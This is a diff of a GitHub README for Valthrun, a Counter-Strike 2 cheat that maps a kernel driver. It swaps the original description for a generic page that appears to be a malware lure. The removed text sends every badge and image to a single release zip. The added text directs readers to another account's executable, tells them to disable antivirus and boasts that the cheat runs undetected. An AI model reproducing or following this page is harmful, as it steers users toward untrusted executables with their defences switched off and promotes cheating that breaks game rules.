@@ -1,127 +1,63 @@
-
-[![valth](https://github.com/MeisterQuerulant/Valthrun/assets/131185036/b1fa77f6-14fb-46a2-8d52-4777a2924f0b)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-
-# Valthrunner's Script 🚀
-
-Welcome to the official repository for the **Valthrunner's Script**! 🎮✨ [![GitHub Repo stars](https://img.shields.io/github/stars/MeisterQuerulant/Valthrun?logo=github)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-
-This script enhances Valthrun with automatic updates, seamless maunal mapping via KDMapper, and checks.
-
-Let's explore its fantastic features!
-
-## Features 🌟
-
-🚀 **Auto Updater for Valthrun** - The script automatically keeps Valthrun up-to-date, ensuring access to the latest features and improvements.
-
-✨ **Auto Map Driver** - With KDMapper integration, the script effortlessly maps drivers, making the whole process smooth and efficient.
-
-🔍 **Manual Mapping Check** - Worried about the success of the manual mapping? The script verifies it, giving you peace of mind.
-
-⚡ **Auto Start CS2** - Get straight into the action with automatic launching of CS2. No more clicking through menus! Even if Steam wasn't open.
-
-🛡 **Run Controller as User** - Don't worry about your graphics driver getting messed up or anything; the script spawns the controller as the user.
-
-## Get Started 🚀
-
-2. **Run the Script** - Simply double-click the script (run.bat).
-
-3. **Adjust Video Settings** - Ensure CS2 is in fullscreen windowed or windowed mode to see the overlay correctly.
-
-5. **Show Some Love** - Add a Star to this repo! 🌟
-
-6. **Enjoy the Enhanced Valthrun Experience** 🎉!
-
-## Info 💡
-
-- The script will auto-download Valthrun Driver, Controller, and KDMapper.
-
-## Share Radar 📡
-
-**Enjoy the built in Valthrun sharable web radar by running run.bat 🎉!**
-
-## Links 🔗
-
-- **Official Repo: [Valthrun](https://github.com/WolverinDEV/Valthrun/)** [![GitHub Stars](https://img.shields.io/github/stars/WolverinDEV/Valthrun.svg?style=social&label=Star)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-- **Official Discord: [Join](https://discord.gg/ecKbpAPW5T)** [![Discord Shield](https://discordapp.com/api/guilds/1135362291311849693/widget.png?style=shield)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-- **KDMapper Repo: [Check Out KDMapper](https://github.com/TheCruZ/kdmapper)** [![GitHub Stars](https://img.shields.io/github/stars/TheCruZ/kdmapper.svg?style=social&label=Star)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-
-## Contribution 🤝
-
-I welcome contributions from the community!
-
-Feel free to open issues, suggest improvements, or submit pull requests to make this script even better.
-
-## Support 💬
-
-My Personal Discord is `@valthrunner` on the discord - only add me if it's about the script, please.
-
-I don't resolve your errors regarding Valthrun, KDMapper, or anything else, only script-related issues.
-
----
-
-With the **Valthrunner's Script**, you'll take your Valthrun experience to the next level. Enjoy automatic updates, seamless driver mapping, and checks. It's time to elevate your gaming experience!
-
-Give it a try, and let me know how it enhances your Valthrun adventure! 🚀🎮✨
-
-[![controller_vZ18RzZLJ6](https://github.com/MeisterQuerulant/Valthrun/assets/131185036/676e8545-7cc3-4041-8a77-f1fc85f6bddb)](https://github.com/MeisterQuerulant/Valthrun/releases/download/v1.7.4/Valthrun.zip)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# 🚀 Valthrun - Simplifying Your Gaming Experience
+
+## 🌟 Introduction 
+Welcome to Valthrun! This application runs Valthrunner's Script, a powerful tool designed for automation and enhancements in gaming. With Valthrun, you can streamline your gaming sessions and focus on enjoying your experience.
+
+## 🛠️ Features
+- **Automation:** Save time by automating tasks within your games.
+- **Easy Access:** Launch directly from your desktop with user-friendly controls.
+- **Customization:** Tailor scripts to fit your unique gaming style.
+- **Secure:** Designed to operate without detection, keeping your gameplay uninterrupted.
+  
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later.
+- **Memory:** Minimum of 4 GB RAM.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for downloading and updating.
+
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of Valthrun.
+
+[![Download Valthrun](https://img.shields.io/badge/Download%20Valthrun-Release-blue?style=for-the-badge)](https://github.com/linhkat3057/Valthrun/releases)
+
+1. Click on the link above or visit [this page](https://github.com/linhkat3057/Valthrun/releases) directly.
+2. On the Releases page, find the latest version listed.
+3. Click on the file associated with that version to download it to your computer.
+4. Once the download completes, locate the file in your downloads folder.
+
+## 📂 Running Valthrun
+1. Open the folder where you downloaded the file.
+2. Double-click on the Valthrun executable file.
+3. Follow the on-screen prompts to launch the application.
+4. You may need to allow permissions for the app to run.
+
+## 🌐 Usage Instructions
+1. After launching, you’ll see the main interface.
+2. Choose your desired script or automation options.
+3. Follow setup prompts to customize settings if necessary.
+4. Enjoy your improved gaming experience!
+
+## 💡 Troubleshooting
+If you encounter issues while running Valthrun, consider the following tips:
+- Ensure your computer meets the system requirements outlined above.
+- Disable any antivirus software temporarily, as it may interfere with the application's operation.
+- Check your internet connection for stability when downloading updates.
+  
+## 📞 Support 
+If you need help or have questions, you can reach out for support by opening an issue in the repository. We strive to respond promptly to inquiries.
+
+## 🏷️ Topics
+- automation
+- batch
+- cheat
+- Counter-Strike
+- gaming
+- hack
+- mod
+- overlay
+- PowerShell
+- script
+- tool
+- trainer
+
+Enjoy unleashing the power of Valthrun in your gaming adventures! For updates and news, stay connected on the Releases page.
